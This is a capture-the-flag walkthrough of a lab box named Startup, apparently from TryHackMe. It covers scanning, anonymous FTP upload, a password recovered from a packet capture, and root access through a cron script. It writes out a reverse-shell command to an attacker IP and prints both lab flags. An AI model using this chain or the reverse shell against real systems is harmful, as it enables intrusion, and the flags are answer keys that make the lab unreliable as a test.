`┌──(kali㉿kali)-[~/THM/Startup]`
`└─$ nmap -sV -sC -Pn -p- --min-rate=1000 -n 10.201.109.195 -oN 10.201.109.195_fullscan.txt`
`Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 17:27 UTC`
`Nmap scan report for 10.201.109.195`
`Host is up (0.14s latency).`
`Not shown: 65532 closed tcp ports (reset)`
`PORT   STATE SERVICE VERSION`
`21/tcp open  ftp     vsftpd 3.0.3`
`| ftp-syst:` 
`|   STAT:` 
`| FTP server status:`
`|      Connected to 10.8.72.228`
`|      Logged in as ftp`
`|      TYPE: ASCII`
`|      No session bandwidth limit`
`|      Session timeout in seconds is 300`
`|      Control connection is plain text`
`|      Data connections will be plain text`
`|      At session startup, client count was 2`
`|      vsFTPd 3.0.3 - secure, fast, stable`
`|_End of status`
`| ftp-anon: Anonymous FTP login allowed (FTP code 230)`
`| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]`
`| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg`
`|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt`
`22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)`
`|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)`
`|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)`
`80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))`
`|_http-server-header: Apache/2.4.18 (Ubuntu)`
`|_http-title: Maintenance`
`Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`

`Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`
`Nmap done: 1 IP address (1 host up) scanned in 87.48 seconds`


We can login to ftp via username ftp without any pass.

Username in file notice.txt:
Maya

I also notice that the directory ftp is writeable because of "`ftp [NSE: writeable]"`

This means if we find the /uploads/ directory on the http server we could upload a reverse shell and execute it.

We find a file named "receipe.txt" with the following

`www-data@startup:/$ cat recipe.txt`
`cat recipe.txt`
`Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.`

then i tried to access /www directory but we don't have perms?

then we find a user "lennie" in the /home directory, but we can't access it.
We also find a directory named "incidents" with a pcpng file in it.

I accessed the ftp server internally and uploaded the pcpng file so i could analyze it on my attacker machine.

We find a series of packets showing the user doing "sudo -l" and it asks for sudo password for www-data and the user inputs "c4ntg3t3n0ughsp1c3" which then proceeds to fail?

This password seems too specific to be a random password or mistype. They definitely meant this for another user and what did we just find moments ago? lennie.

Running "su lennie" in our revshell and inputting that password upgrades our shell to lennie.

We then find the user.txt flag
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

Inside of scripts we find the following:
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Oct 23 20:17 startup_list.txt

And what's interesting is that this file was just accessed/modified. This makes me believe there is some kind of crontab running on this.

planner.sh is executed > $LIST is set to that startup_list.txt > then we execute /etc/print.sh

We have write access to this file 
-rwx------ 1 lennie lennie 40 Oct 23 19:57 /etc/print.sh

so we can echo to write a reverse shell to bind us, and it's also executed by root.
echo "sh -i >& /dev/tcp/10.8.72.228/4242 0>&1" > /etc/print.sh

open a netcat on 4242 and boom!

`# cat root.txt`
`THM{f963aaa6a430f210222158ae15c3d76d}`
`# whoami`
`root`

Thanks for stopping by!















